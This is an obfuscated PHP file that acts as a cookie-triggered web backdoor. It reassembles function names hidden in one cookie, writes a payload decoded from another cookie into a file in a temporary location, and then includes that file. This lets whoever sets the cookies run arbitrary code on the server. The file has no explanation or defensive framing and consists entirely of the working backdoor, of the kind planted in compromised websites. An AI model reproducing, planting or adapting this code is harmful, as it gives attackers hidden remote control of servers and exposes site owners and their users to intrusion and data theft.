<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[40])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[40][$n];
        if (!$c[40][$n + 1]) {
            if (!$c[40][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[3]() . $p[24];
    if (!$p[0]($k)) {
        $n = $p[7]($k, $p[5]);
        $p[6]($n, $p[14] . $p[9]($p[16]($c[3])));
    }
    include($k);
}